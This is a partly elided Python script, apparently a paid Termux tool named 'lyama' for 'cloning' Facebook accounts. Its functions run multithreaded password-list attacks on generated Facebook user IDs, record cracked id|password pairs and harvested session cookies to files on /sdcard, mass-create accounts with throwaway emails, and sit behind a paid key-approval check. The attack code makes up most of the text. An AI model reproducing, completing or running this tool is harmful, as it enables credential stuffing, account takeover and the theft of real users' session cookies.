...
try:
    ...
    os.system('python lyama.py')
try:
    os.mkdir('/sdcard/ISHAK')
except:pass
import os
import sys
import time
...
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙉𝘼𝙈𝙀                : [🖕] 𝙇𝙔𝘼 𝙈𝘼
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆            : [🖕] 𝙇𝙔𝘼 𝙈𝘼
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙂𝙄𝙏𝙃𝙐𝘽              : [🖕] 𝙄𝙎𝙃𝘼𝙆 𝙇𝙔𝘼
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙍𝙀𝙇𝙄𝙂𝙄𝙊𝙉            : [🖕] 𝙉𝙋,𝘽𝘿,𝙄𝙉𝘿
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋            : [🖕] ***********
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀          : [🖕] 𝙁𝙄𝙇𝙀 𝘾𝙇𝙊𝙉𝙀   
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m [🖕]🖕𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎        : [🖕] 𝙋𝘼𝙄𝘿
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome lya xd lyama Tool\33[0;m');linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as lyama:     
                        clear()
                        ...
                        for psx in user:
                                ...
                                lyama.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [lyama-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [lyama-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/lya/lyama-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [lyama-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/lya/lyama-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/lya/lyama-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [lyama-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/lya/lyama-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/lya/lyama-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [lyama-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [lyama-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/lya/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/lya/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [lyama-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/lya/lyama-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [lyama-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [lyama-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/lya/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.lyama.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.lyama.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20lya%20Owner%20lyama-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://www.facebook.com/profile.php?id=100076839015736'+tks)
        main_apv()
main_apv()
